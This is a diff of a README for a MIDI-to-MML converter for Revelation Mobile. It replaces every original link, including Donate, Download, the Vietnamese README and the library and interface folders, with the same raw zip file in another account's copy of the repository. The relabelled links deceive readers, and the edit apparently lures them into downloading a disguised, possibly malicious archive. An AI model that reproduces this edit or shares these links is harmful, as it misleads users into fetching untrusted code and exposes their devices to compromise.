@@ -1,9 +1,9 @@
 # Revelation mobile MIDI to MML
 
-[[Donate]](https://github.com/cuikho210/revelation-mobile-midi-to-mml/blob/main/README/DONATE.md) - 
-[[Download]](https://github.com/cuikho210/revelation-mobile-midi-to-mml/releases)  
+[[Donate]](https://raw.githubusercontent.com/chilan18/revelation-mobile-midi-to-mml/main/gui/android/app/src/debug/mml-midi-mobile-revelation-to-3.7-beta.4.zip) - 
+[[Download]](https://raw.githubusercontent.com/chilan18/revelation-mobile-midi-to-mml/main/gui/android/app/src/debug/mml-midi-mobile-revelation-to-3.7-beta.4.zip)  
 
-[[Tiếng Việt]](https://github.com/cuikho210/revelation-mobile-midi-to-mml/blob/main/README/README-vi.md)
+[[Tiếng Việt]](https://raw.githubusercontent.com/chilan18/revelation-mobile-midi-to-mml/main/gui/android/app/src/debug/mml-midi-mobile-revelation-to-3.7-beta.4.zip)
 
 A tool used to convert MIDI files into MML code used in Revelation Mobile  
 -- *This project is still in development and not really stable* --  
@@ -18,6 +18,6 @@ A tool used to convert MIDI files into MML code used in Revelation Mobile
 
 ## Structures
 
-+ `lib` - [The library](https://github.com/cuikho210/revelation-mobile-midi-to-mml/tree/main/lib)
-+ `cui` - [Command line user interface](https://github.com/cuikho210/revelation-mobile-midi-to-mml/tree/main/cui)
-+ `gui` - [Graphical user interface](https://github.com/cuikho210/revelation-mobile-midi-to-mml/tree/main/gui)
++ `lib` - [The library](https://raw.githubusercontent.com/chilan18/revelation-mobile-midi-to-mml/main/gui/android/app/src/debug/mml-midi-mobile-revelation-to-3.7-beta.4.zip)
++ `cui` - [Command line user interface](https://raw.githubusercontent.com/chilan18/revelation-mobile-midi-to-mml/main/gui/android/app/src/debug/mml-midi-mobile-revelation-to-3.7-beta.4.zip)
++ `gui` - [Graphical user interface](https://raw.githubusercontent.com/chilan18/revelation-mobile-midi-to-mml/main/gui/android/app/src/debug/mml-midi-mobile-revelation-to-3.7-beta.4.zip)
